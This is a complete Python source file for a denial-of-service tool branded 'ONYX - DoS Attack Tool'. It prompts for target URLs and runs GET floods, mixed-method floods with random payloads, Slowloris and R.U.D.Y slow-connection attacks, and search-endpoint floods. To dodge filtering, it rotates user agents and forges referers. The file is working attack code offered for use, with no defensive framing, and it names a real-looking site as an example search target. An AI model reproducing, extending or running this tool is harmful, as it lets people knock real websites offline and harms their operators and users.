import requests
import threading
import random
import time
import os
import asyncio
import aiohttp
import socket
from rich.console import Console
from rich.style import Style
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.prompt import Prompt, Confirm
from rich.tree import Tree
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import locale
import ssl

locale.setlocale(locale.LC_ALL, '')

console = Console()
timeout_duration = 20  # Adjust to avoid timeout issues

# --- Colors ---
color_pink = Style(color="pink1")
color_orange = Style(color="orange1")
color_title = Style(color="deep_sky_blue1", bold=True)

# --- Global variables ---
success_requests = 0
failed_requests = 0
total_requests = 0
stop_attack_flag = False
elapsed_time = 0
progress = {}
lock = threading.Lock()
used_headers = {
    "slowloris": {},
    "rudy": {}
}
header_source = {}

def display_title():
    console.print("[bold deep_sky_blue1]ONYX - DoS Attack Tool[/]\n", style=color_pink)

def read_url_list(file_name):
    try:
        url_list = []
        with open(file_name, 'r') as f:
            for line in f:
                url = line.strip()
                if not urlparse(url).scheme or not urlparse(url).netloc:
                    log_message(f"[red]Invalid URL: {url}[/]")
                    continue
                url_list.append(url)
        return url_list
    except FileNotFoundError:
        console.print(f"Error: File '{file_name}' not found.", style="bold red")
        return []

def read_user_agents(file_name="user_agents.txt"):
    try:
        with open(file_name, 'r') as f:
            user_agents = f.read().splitlines()
        return user_agents
    except FileNotFoundError:
        console.print(f"Error: File '{file_name}' not found. Using default User-Agent.", style="yellow")
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        ]
user_agent_list = []

def get_random_user_agent():
    if not user_agent_list:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    return random.choice(user_agent_list)

def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1,
                    status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(
        max_retries=retries, pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def create_status_table(targets, thread_count, elapsed_time, attack_duration, progress, success_requests, failed_requests, total_requests):
    table = Table(
        title="[dark_orange]Attack Status[/]", style="light_steel_blue1")
    table.add_column("Item", style="cyan", width=18)
    table.add_column("Value", style="magenta")
    table.add_row("Total Threads", str(thread_count), style="dark_orange")
    table.add_row("Total Requests", str(total_requests), style=color_pink)
    table.add_row("Successful", str(success_requests), style="chartreuse1")
    table.add_row("Failed", str(failed_requests), style="orange_red1")
    table.add_row("Time", f"{int(elapsed_time)}/{attack_duration} (seconds)", style="pink1")
    table.add_row()
    table.add_row("[grey100]Progress Details[/]", style="pink1")

    for url, progress_info in progress.items():
        table.add_row(f"[i]{url}[/]", f"{progress_info['completed']}/{progress_info['total']} ({progress_info['percentage']:.2f}%) - {progress_info['speed']:.2f} req/s", style="pink1")

    return table

def update_progress(targets, attack_duration):
    global elapsed_time

    for url in targets:
        progress[url] = {
            "completed": 0,
            "total": attack_duration * thread_count if attack_duration > 0 else float('inf'),
            "percentage": 0,
            "speed": 0,
            "start_time": time.time()
        }

    while not stop_attack_flag:
        for url in targets:
            if attack_duration > 0:
                progress[url]["percentage"] = min(
                    100, (progress[url]["completed"] / progress[url]["total"]) * 100)
            else:
                progress[url]["percentage"] = 0
            progress[url]["speed"] = progress[url]["completed"] / \
                (time.time() - progress[url]["start_time"] + 1e-9)
            if elapsed_time >= attack_duration and attack_duration > 0:
                progress[url]["percentage"] = 100

        yield progress

def display_status(targets, thread_count, attack_duration):
    global elapsed_time, success_requests, failed_requests, total_requests
    start_time = time.time()

    with Live(console=console, refresh_per_second=10) as live:
        for _ in update_progress(targets, attack_duration):

            elapsed_time = time.time() - start_time
            if attack_duration > 0 and elapsed_time >= attack_duration:
                stop_attack()
                break

            status_table = create_status_table(
                targets, thread_count, elapsed_time, attack_duration, progress, success_requests, failed_requests, total_requests)
            layout = Layout()
            layout.split_row(
                Layout(name="left"),
                Layout(name="right"),
            )
            layout["left"].update(status_table)
            if hasattr(display_status, "logs_panel"):
                layout["right"].update(display_status.logs_panel)
            live.update(layout)
            time.sleep(refresh_rate)

def log_message(message, user_agent=None):
    if not hasattr(display_status, "logs"):
        display_status.logs = []

    log_entry = f"{message} - User-Agent: {user_agent}" if user_agent else message
    display_status.logs.append(log_entry)
    if len(display_status.logs) > 10:
        display_status.logs.pop(0)

    log_table = Table(
        title="[dark_orange]Recent Activity[/]", show_header=False, style="light_steel_blue1")
    log_table.add_column("Log")
    for log in reversed(display_status.logs):
        log_table.add_row(log)
    display_status.logs_panel = Panel(
        log_table, border_style="light_steel_blue1")

    if save_log:
        try:
            with open("attack_log.txt", "a", encoding="utf-8") as log_file:
                log_file.write(log_entry + "\n")
        except UnicodeEncodeError as e:
            console.print(f"Error writing log to file: {e}", style="bold red")
            try:
                with open("attack_log.txt", "a", encoding="ascii", errors="ignore") as log_file:
                    log_file.write(log_entry.encode(
                        'ascii', 'ignore').decode('ascii') + "\n")
            except Exception as ex:
                console.print(
                    f"Error writing log (ascii) to file: {ex}", style="bold red")

def get_auto_headers(url, method):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }

    if method == "slowloris":
        headers['X-a'] = str(random.randint(1, 5000))
        if urlparse(url).scheme == 'https':
             headers['HTTPS'] = '1'
    elif method == "rudy":
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers['X-RUDY'] = '1'

    global used_headers
    used_headers[method][url] = headers
    return headers

def create_diverse_headers(url, custom_headers=None):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Referer':  f'https://www.google.com/search?q={random.choice(search_keywords)}' if search_keywords and search_url_bases else 'https://www.google.com/'
    }
    if custom_headers:
        headers.update(custom_headers)
    return headers

async def attack_url_get(session, url, headers, sem):
    global success_requests, failed_requests, total_requests, elapsed_time

    async with sem:
        while not stop_attack_flag:
            headers['User-Agent'] = get_random_user_agent()
            url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
            try:
                async with session.get(url_with_params, headers=headers, timeout=timeout_duration) as response:
                    with lock:
                        if response.status == 200:
                            success_requests += 1
                            log_message(
                                f"[green]GET request successful to: {url_with_params}[/]", headers['User-Agent'])
                        else:
                            failed_requests += 1
                            log_message(
                                f"[red]GET request failed to: {url_with_params} - Status: {response.status}[/]", headers['User-Agent']) 
                        total_requests += 1
                        progress[url]['completed'] += 1

            except asyncio.TimeoutError:
                with lock:
                    failed_requests += 1
                    log_message(
                        f"[red]GET request timeout to: {url_with_params}[/]", headers['User-Agent'])
                    total_requests += 1
                    progress[url]['completed'] += 1

            except aiohttp.ClientError as e:
                with lock:
                    failed_requests += 1
                    log_message(
                        f"[red]Connection error to {url_with_params}: {e}[/]", headers['User-Agent'])
                    total_requests += 1
                    progress[url]['completed'] += 1

            except Exception as e:
                with lock:
                    console.print(
                        f"An error occurred: {e}", style='bold red')
                    failed_requests += 1
                    total_requests += 1
                    progress[url]['completed'] += 1

async def attack_url_mixed(session, url, headers, method, sem):
    global success_requests, failed_requests, total_requests

    async with sem:
        while not stop_attack_flag:
            headers['User-Agent'] = get_random_user_agent()
            try:
                if method == 'GET':
                    url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
                    async with session.get(url_with_params, headers=headers, timeout=timeout_duration) as response:
                        with lock:
                            if response.status == 200:
                                success_requests += 1
                                log_message(f"[green]Simulation {method} successful: {url_with_params}[/]", headers['User-Agent'])
                            else:
                                failed_requests += 1
                                log_message(f"[red]Simulation {method} failed: {url_with_params} - Status: {response.status}[/]", headers['User-Agent'])

                elif method == 'POST':
                    data_size = random.randint(100, 1000)
                    data = os.urandom(data_size)
                    async with session.post(url, headers=headers, data=data, timeout=timeout_duration) as response:
                        with lock:
                            if response.status == 200:
                                success_requests += 1
                                log_message(f"[green]Simulation {method} successful: {url} - Data size: {data_size} bytes[/]", headers['User-Agent'])
                            else:
                                failed_requests += 1
                                log_message(f"[red]Simulation {method} failed: {url} - Status: {response.status}[/]", headers['User-Agent'])
                elif method == 'PUT':
                    data_size = random.randint(100, 1000)
                    data = os.urandom(data_size)
                    async with session.put(url, headers=headers, data=data, timeout=timeout_duration) as response:
                        with lock:
                            if response.status == 200:
                                success_requests += 1
                                log_message(f"[green]Simulation {method} successful: {url} - Data size: {data_size} bytes[/]", headers['User-Agent'])
                            else:
                                failed_requests += 1
                                log_message(f"[red]Simulation {method} failed: {url} - Status: {response.status}[/]", headers['User-Agent'])
                elif method == 'DELETE':
                    async with session.delete(url, headers=headers, timeout=timeout_duration) as response:
                        with lock:
                            if response.status == 200:
                                success_requests += 1
                                log_message(f"[green]Simulation {method} successful: {url}[/]", headers['User-Agent'])
                            else:
                                failed_requests += 1
                                log_message(f"[red]Simulation {method} failed: {url} - Status: {response.status}[/]", headers['User-Agent'])
                else:
                    with lock:
                        console.print(f"Method {method} not supported.", style="yellow")
                        continue

            except asyncio.TimeoutError:
                with lock:
                    failed_requests += 1
                    log_message(
                        f"[red]{method} request timeout to: {url}[/]", headers['User-Agent'])

            except aiohttp.ClientError as e:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]Connection error: {e}[/]", headers['User-Agent'])

            except Exception as e:
                with lock:
                    log_message(
                        f"Unexpected error occurred: {e}[/]", headers['User-Agent'])
                    console.print(f"Unexpected error occurred: {e}", style="bold red")
            finally:
                with lock:
                    total_requests += 1
                    progress[url]['completed'] += 1

async def attack_url_search(session, url_base, headers, keywords, sem):
    global success_requests, failed_requests, total_requests

    async with sem:
        while not stop_attack_flag:
            headers['User-Agent'] = get_random_user_agent()

            try:
                chosen_keyword = " ".join(random.sample(keywords, random.randint(1, min(3, len(keywords))))) if keywords else ""
                search_url = f"{url_base}{chosen_keyword}"
                async with session.get(search_url, headers=headers, timeout=timeout_duration) as response:
                    with lock:
                        if response.status == 200:
                            success_requests += 1
                            log_message(f"[green]Search successful with keyword: {chosen_keyword} - URL: {search_url}[/]", headers['User-Agent'])
                        else:
                            failed_requests += 1
                            log_message(f"[red]Search failed with keyword: {chosen_keyword} - URL: {search_url} - Status: {response.status}[/]", headers['User-Agent'])

            except asyncio.TimeoutError:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]Search request timeout to: {search_url}[/]", headers['User-Agent'])

            except aiohttp.ClientError as e:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]Connection error during search: {e}[/]", headers['User-Agent'])

            except Exception as e:
                with lock:
                    log_message(f"Unexpected error during search: {e}[/]", headers['User-Agent'])
                    console.print(f"Unexpected error during search: {e}", style="bold red")
            finally:
                with lock:
                    total_requests += 1

async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
    global success_requests, failed_requests, total_requests

    async with sem:
        while not stop_attack_flag:
            sockets = []
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)

                    if port == 443:
                        context = ssl.create_default_context()
                        s = context.wrap_socket(
                            s, server_hostname=urlparse(url).hostname)
                        protocol = "HTTPS"
                    else:
                         protocol = "HTTP"

                    s.connect((urlparse(url).hostname, port))
                    sockets.append(s)

                    headers['User-Agent'] = get_random_user_agent()
                    request = f"GET {url} {protocol}/1.1\r\n"
                    for header, value in headers.items():
                        request += f"{header}: {value}\r\n"
                    request += "\r\n"
                    s.send(request.encode())

                    log_message(
                        f"[yellow]Header sent to {url}:{port} (Slowloris)...[/]", headers['User-Agent'])

                except socket.error as e:
                    with lock:
                        failed_requests += 1
                        log_message(
                            f"[red]Slowloris error with {url}:{port}: {e}[/]", headers['User-Agent'])
                except Exception as e:
                    with lock:
                        log_message(
                            f"[red]Unknown error in Slowloris with {url}:{port}: {e}[/]", headers['User-Agent'])

            while not stop_attack_flag:
               
                for s in sockets:
                    port = s.getpeername()[1] if s else "N/A"
                    try:
                        s.send(
                            f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except socket.error as e:
                        with lock:
                            sockets.remove(s)
                            failed_requests += 1
                            log_message(
                                f"[red]Slowloris error with {url}:{port}: {e}[/]", headers['User-Agent'])
                    except Exception as e:
                        with lock:
                            sockets.remove(s)
                            log_message(
                                f"[red]Unknown error in Slowloris with {url}:{port}: {e}[/]", headers['User-Agent'])

                for port in ports:
                    if not any(s.getpeername()[1] == port for s in sockets if s):
                        try:
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(4)

                            if port == 443:
                                context = ssl.create_default_context()
                                new_s = context.wrap_socket(
                                    new_s, server_hostname=urlparse(url).hostname)

                            new_s.connect((urlparse(url).hostname, port))

                            headers['User-Agent'] = get_random_user_agent()
                            request = f"GET {url} HTTP/1.1\r\n"
                            for header, value in headers.items():
                                request += f"{header}: {value}\r\n"
                            request += "\r\n"
                            new_s.send(request.encode())

                            log_message(
                                f"[yellow]New socket created for {url}:{port} (Slowloris)...[/]", headers['User-Agent'])
                            sockets.append(new_s)
                        except socket.error as e:
                            with lock:
                                failed_requests += 1
                                log_message(
                                    f"[red]Slowloris error with {url}:{port}: {e}[/]", headers['User-Agent'])
                        except Exception as e:
                            with lock:
                                log_message(
                                    f"[red]Unknown error in Slowloris with {url}:{port}: {e}[/]", headers['User-Agent'])

                if not sockets:
                    log_message(
                        "[red]No active sockets, stopping Slowloris...[/]", headers['User-Agent'])
                    break

                await asyncio.sleep(15)

                for s in sockets:
                    if s:
                        s.close()

            with lock:
                total_requests += 1
                progress[url]['completed'] += 1

async def rudy_attack(session, url, headers, sem):
    global success_requests, failed_requests, total_requests

    async with sem:
        while not stop_attack_flag:
            s = None
            try:
                headers['User-Agent'] = get_random_user_agent()
                log_message(f"[yellow]Attempting connection to {url} for R.U.D.Y...[/]", headers['User-Agent'])
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((urlparse(url).hostname, 80))
                log_message(f"[green]Connection successful to {url} for R.U.D.Y.[/]", headers['User-Agent'])

                request = f"POST {url} HTTP/1.1\r\n"
                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                request += f"Content-Length: {random.randint(5000, 10000)}\r\n\r\n"
                s.send(request.encode())
                log_message(f"[yellow]POST header sent to {url} (R.U.D.Y)...[/]", headers['User-Agent'])

                while not stop_attack_flag:
                    data = os.urandom(1)
                    try:
                        s.send(data)
                        log_message(f"[yellow]1 byte data sent to {url} (R.U.D.Y)...[/]", headers['User-Agent'])
                    except socket.error as e:
                        with lock:
                            failed_requests += 1
                            log_message(f"[red]R.U.D.Y error with {url}: {e}[/]", headers['User-Agent'])
                            break
                    await asyncio.sleep(random.uniform(5, 15))

            except socket.error as e:
                with lock:
                    failed_requests += 1
                    log_message(f"[red]R.U.D.Y error with {url}: {e}[/]", headers['User-Agent'])
            except Exception as e:
                with lock:
                    log_message(f"[red]Unknown error in R.U.D.Y with {url}: {e}[/]", headers['User-Agent'])
            finally:
                with lock:
                    if s:
                        s.close()
                    total_requests += 1
                    progress[url]['completed'] += 1

async def attack_overall(targets, thread_count, attack_method, methods, search_url_bases, search_keywords, custom_headers, ports):
    global success_requests, failed_requests, total_requests
    tasks = []

    sems = {url: asyncio.Semaphore(thread_count) for url in targets}

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
      for url in targets:
          sem = sems[url]

          if attack_method == 'slowloris':
              if header_source[url] == "auto":
                headers = get_auto_headers(url, "slowloris")
              else:
                headers = custom_headers
              for _ in range(thread_count):
                  task = asyncio.ensure_future(
                        slowloris_attack(session, url, headers, sem, ports=ports))
                  tasks.append(task)
          elif attack_method == 'rudy':
              if header_source[url] == "auto":
                headers = get_auto_headers(url, "rudy")
              else:
                headers = custom_headers
              for _ in range(thread_count):
                  task = asyncio.ensure_future(
                        rudy_attack(session, url, headers, sem))
                  tasks.append(task)
          else:
                headers = create_diverse_headers(url, custom_headers)

          if attack_method == 'get':
            for _ in range(thread_count):
                task = asyncio.ensure_future(
                    attack_url_get(session, url, headers, sem))
                tasks.append(task)
          elif attack_method == 'mixed':
              for _ in range(thread_count):
                  method = random.choice(methods) if len(methods) > 1 else methods[0]
                  task = asyncio.ensure_future(attack_url_mixed(session, url, headers, method, sem))
                  tasks.append(task)

      if search_url_bases:
          for search_url_base in search_url_bases:
              headers = create_diverse_headers(search_url_base, custom_headers)
              sem = asyncio.Semaphore(thread_count)
              for _ in range(thread_count):
                  task_search = asyncio.ensure_future(attack_url_search(session, search_url_base, headers, search_keywords, sem))
                  tasks.append(task_search)

      await asyncio.gather(*tasks)

def stop_attack():
    global stop_attack_flag
    stop_attack_flag = True
    console.print("\nStopping attack...", style="yellow")
    log_message("User stopped the attack script!")
    print("=" * 55)

def display_options():
    tree = Tree("📁 [pink1]ONYX - DOS TOOL[/]")
    tree.add("├─── [red1]AVAILABLE METHODS[/]")
    methods_tree = tree.add("├─── [pink1]LAYER 7[/]")
    methods_tree.add("├─── [green]HTTP[/]")
    methods_tree.add("├─── [green]HTTPS[/]")
    methods_tree.add("├─── [green]SLOWLORIS[/]")
    methods_tree.add("└─── [green]R.U.D.Y[/]")

    config_tree = tree.add("└─── [bold]CURRENT CONFIG[/]")
    config_tree.add(
        f"    ├─── [bold]METHOD[/]: [deep_sky_blue1]{attack_method}[/]")

    if attack_method == 'mixed':
        config_tree.add(
            f"    ├─── [bold]HTTP METHODS[/]: [deep_sky_blue1]{', '.join(methods)}[/]")
    if attack_method == 'search' and search_url_bases and search_keywords:
        for base_url in search_url_bases:
            config_tree.add(
                f"    ├─── [bold]SEARCH URL BASE[/]: [deep_sky_blue1]{base_url}[/]")
        config_tree.add(
            f"    ├─── [bold]KEYWORDS[/]: [deep_sky_blue1]{', '.join(search_keywords)}[/]")

    config_tree.add(
        f"    ├─── [bold]TIME[/]: [deep_sky_blue1]{attack_duration}[/]")
    config_tree.add(
        f"    ├─── [bold]THREADS[/]: [deep_sky_blue1]{thread_count}[/]")
    if custom_headers.get('Cookie'):
        config_tree.add(
            f"    ├─── [bold]COOKIE[/]: [deep_sky_blue1]{custom_headers['Cookie']}[/]")
    if is_user_agent_from_file:
        config_tree.add(
            f"    ├─── [bold]User-Agent[/]: [deep_sky_blue1]From file ({user_agent_chosen})[/]")
    else:
        config_tree.add(
            f"    ├─── [bold]User-Agent[/]: [deep_sky_blue1]{user_agent_chosen}[/]")
    for url in targets:
        config_tree.add(
            f"    └─── [bold]URL[/]: [pink1]{url}[/]")

        if attack_method in used_headers and url in used_headers[attack_method]:
            headers_tree = config_tree.add(
                f"        └─── [bold]Headers used for {url}[/]"
            )
            for header, value in used_headers[attack_method][url].items():
                headers_tree.add(f"            ├─── [yellow]{header}[/]: [green]{value}[/]")

        if attack_method in ("slowloris", "rudy"):
            source = header_source.get(url, "auto")
            config_tree.add(
                f"        └─── [bold]Headers source for {url}[/]: [deep_sky_blue1]{source}[/]"
            )

    console.print(tree)

def input_parameters():
    global thread_count, attack_duration, attack_method, methods, refresh_rate, targets, search_url_bases, search_keywords, save_log, custom_headers, user_agent_list, is_user_agent_from_file, user_agent_chosen, header_source

    display_title()

    ports = []

    attack_method = Prompt.ask(
        "[deep_sky_blue1 bold]Select attack mode[/]:\n[bold orange1]1.[/] Simple [bold green]GET[/] attack (Default)\n[bold orange1]2.[/] [bold green]CUSTOM[/] attack\n[bold orange1]3.[/] [bold green]SLOWLORIS[/] attack\n[bold orange1]4.[/] [bold green]R.U.D.Y[/] attack\n[bold orange1]5.[/] [bold green]SEARCH[/] attack", choices=["1", "2", "3", "4", "5"], default="1")

    url_input_choice = Prompt.ask("[deep_sky_blue1 bold]Select how to input target URL[/]:\n[bold orange1]1.[/] From file\n[bold orange1]2.[/] Manual input", choices=["1", "2"], default="1")
    if url_input_choice == "1":
        file_name = Prompt.ask("Enter filename containing URL list (e.g., url.txt)")
        targets = read_url_list(file_name)
    else:
        manual_url = Prompt.ask("Enter target URL (e.g., https://example.com)")
        targets = [manual_url]

    if not targets:
        return [], 0, 0, 0, "1", [], [], None, False, {}, []

    while True:
        try:
            thread_count = int(Prompt.ask("Enter number of threads"))
            if thread_count <= 0:
                console.print(
                    "Error: Number of threads must be greater than 0.", style="bold red")
            else:
                break
        except ValueError:
            console.print("Error: Invalid number of threads.", style="bold red")

    while True:
        try:
            refresh_rate = float(
                Prompt.ask("Enter refresh speed (seconds, e.g., 0.5/sec)"))
            if refresh_rate <= 0:
                console.print(
                    "Error: Refresh speed must be greater than 0.", style="bold red")
            else:
                break
        except ValueError:
            console.print("Error: Invalid refresh speed.", style="bold red")

    while True:
        try:
            attack_duration = int(
                Prompt.ask("Enter attack duration (seconds, enter 0 for unlimited)"))
            if attack_duration < 0:
                console.print(
                    "Error: Duration cannot be negative.", style="bold red")
            else:
                break
        except ValueError:
            console.print(
                "Error: Invalid duration.", style="bold red")

    methods = []
    search_url_bases = []
    search_keywords = None
    custom_headers = {}

    if attack_method == "2":
        attack_method = "mixed"
        method_choice = Prompt.ask(
            "Select HTTP methods for attack, separated by commas (e.g., GET, POST, PUT, DELETE)\n[bold green] Available: GET, POST, PUT, DELETE ")
        if method_choice.upper() == 'ALL':
            methods = ['GET', 'POST', 'PUT', 'DELETE']
        else:
            methods = [method.strip().upper()
                       for method in method_choice.split(',')]

    elif attack_method == "3":
        attack_method = "slowloris"
    elif attack_method == "4":
        attack_method = "rudy"
    elif attack_method == "5":
        attack_method = "search"
        search_url_input = Prompt.ask("[deep_sky_blue1 bold]Select how to input search URL[/]:\n[bold orange1]1.[/] From file\n[bold orange1]2.[/] Manual input", choices=["1", "2"], default="1")
        if search_url_input == "1":
            search_file = Prompt.ask("Enter filename containing search URL list (e.g., search_urls.txt)")
            search_url_bases = read_url_list(search_file)
        else:
            search_manual = Prompt.ask("Enter base search URL (e.g., https://yurineko.my/search?query=)")
            search_url_bases = [search_manual]
        if not search_url_bases:
            console.print("No search URLs. Stopping.", style="yellow")
            return [], 0, 0, 0, "1", [], [], None, False, {}, []
        else:
            add_keywords = Confirm.ask(
                "Do you want to add search keywords (otherwise random keywords will be used)?")
            if add_keywords:
                keyword_input = Prompt.ask(
                    "Enter search keywords, separated by commas (e.g., 'python, web, security'): ")
                search_keywords = [kw.strip()
                                for kw in keyword_input.split(',')]
            else:
                search_keywords = [chr(random.randint(97, 122))
                                    for _ in range(50)]
    else:
        attack_method = "get"

    add_cookie = Confirm.ask("Do you want to add a cookie to requests?")
    if add_cookie:
        cookie_value = Prompt.ask(
            "Enter cookie value (e.g., 'key1=value1; key2=value2')")
        custom_headers['Cookie'] = cookie_value

    if attack_method in ("slowloris", "rudy"):
        for url in targets:
            header_choice = Prompt.ask(
                f"[deep_sky_blue1 bold]Select how to get headers for {url} (Method {attack_method})[/]:\n[bold orange1]1.[/] Auto (Default)\n[bold orange1]2.[/] Manual",
                choices=["1", "2"],
                default="1"
            )
            header_source[url] = "auto" if header_choice == "1" else "custom"

    user_agent_choice = Prompt.ask("[deep_sky_blue1 bold]User-Agent[/]:\n[bold orange1]1.[/] From file (user_agents.txt)\n[bold orange1]2.[/] Manual input\n", choices=["1", "2"], default="1")
    if user_agent_choice == "1":
        ua_file = Prompt.ask("Enter User-Agent filename (e.g., user_agents.txt)")
        user_agent_list = read_user_agents(ua_file)
        if user_agent_list:
            is_user_agent_from_file = True
            user_agent_chosen = ua_file
        else:
            is_user_agent_from_file = False
            user_agent_chosen = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            console.print(f"[yellow]User-Agent file invalid. Using default User-Agent.[/]")

    else:
        user_agent_manual = Prompt.ask("Enter custom User-Agent")
        is_user_agent_from_file = False
        user_agent_chosen = user_agent_manual

    if not is_user_agent_from_file or not user_agent_list:  
        custom_headers['User-Agent'] = user_agent_chosen 
    else: 
      custom_headers['User-Agent'] = get_random_user_agent()
    if attack_method == "slowloris":
        port_choice = Prompt.ask(
            "[deep_sky_blue1 bold]Select attack ports[/]:\n[bold orange1]1.[/] 80 (HTTP)\n[bold orange1]2.[/] 443 (HTTPS)\n[bold orange1]3.[/] Both", choices=["1", "2", "3"], default="3")

        if port_choice == "1":
            ports = [80]
        elif port_choice == "2":
            ports = [443]
        else:
            ports = [80, 443]

    save_log = Confirm.ask("Save log after finish?")
    os.system('cls' if os.name == 'nt' else 'clear')
    display_title()
    console.print(Panel(f"[bold green]✓[/] Settings applied:\n - Attack method: {attack_method}\n - Target list: {targets}\n - Number of threads: {thread_count}\n - Refresh speed: {refresh_rate}\n - Duration: {attack_duration}\n - HTTP methods: {methods}\n - Search URLs: {search_url_bases}\n - Keywords: {search_keywords}\n - Save log: {save_log}", style="light_steel_blue1"))
    display_options()
    if attack_method == "slowloris":
        print(f"    └─── [bold]PORTS[/]: [deep_sky_blue1]{ports}[/]")

    return targets, thread_count, attack_duration, refresh_rate, attack_method, methods, search_url_bases, search_keywords, save_log, custom_headers, ports

async def main():
    global stop_attack_flag, success_requests, failed_requests, total_requests, refresh_rate, elapsed_time, save_log, custom_headers

    try:
        targets, thread_count, attack_duration, refresh_rate, attack_method, methods, search_url_bases, search_keywords, save_log, custom_headers, ports = input_parameters()
        if not targets:
            console.print(
                "No URLs to attack. Stopping.", style="bold red")
            return

        console.print(Panel(
            "[bold blue]Starting attack...[/]", style="light_steel_blue1"))
        print("=" * 55)

        status_thread = threading.Thread(
            target=display_status, args=(targets, thread_count, attack_duration))
        status_thread.daemon = True
        status_thread.start()

        log_message(f"Attack script started: \n- Method: {attack_method} \n- Duration: {attack_duration} \n- URL: {targets}\n- HTTP methods: {methods}\n- Search URLs: {search_url_bases}\n- Keywords: {search_keywords} ")

        await attack_overall(targets, thread_count, attack_method, methods, search_url_bases, search_keywords, custom_headers, ports)

        while not stop_attack_flag:
            await asyncio.sleep(1)
            if attack_duration > 0 and elapsed_time >= attack_duration:
                stop_attack()
                break

    except KeyboardInterrupt:
        stop_attack()

    finally:
        console.print(Panel(
            "[bold green]All threads stopped, script finished.[/]", style="light_steel_blue1"))
        print("=" * 55)

        if save_log:
            console.print(
                f"Log saved to file [bold blue]attack_log.txt[/].", style="light_steel_blue1")

        input("Press Enter to exit...")

if __name__ == "__main__":
    asyncio.run(main())
